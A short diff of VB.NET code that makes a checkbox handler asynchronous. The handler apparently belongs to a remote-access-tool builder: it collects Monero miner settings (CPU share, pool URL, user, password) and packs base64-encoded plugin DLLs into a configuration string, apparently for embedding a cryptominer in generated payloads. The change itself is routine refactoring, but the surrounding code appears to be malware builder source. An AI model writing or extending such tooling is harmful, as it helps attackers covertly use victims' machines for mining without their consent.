@@ -95,7 +95,7 @@ e:
         End Try
     End Sub
 
-    Private Sub CHKXMR_CheckedChanged(sender As Object, e As EventArgs) Handles CHKXMR.CheckedChanged
+    Private Async Sub CHKXMR_CheckedChanged(sender As Object, e As EventArgs) Handles CHKXMR.CheckedChanged
         If CHKXMR.Checked Then
             Main.CHK_MINER = True
             Dim miner As New XMR
@@ -104,7 +104,7 @@ e:
             miner.MetroButton2.Visible = False
 
             miner.ShowDialog()
-            Dim PLG = Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True))
+            Dim PLG = Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True))
             Dim F = Convert.ToBase64String(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\XMR.dll"))
             Main._MINER_SETTINGS = "IPLM" + Main.SPL + PLG + Main.SPL + "XMR-R|'P'|" + miner.cpu + "|'P'|" + miner.url + "|'P'|" + miner.user + "|'P'|" + miner.pass + "|'P'|" + F
         Else
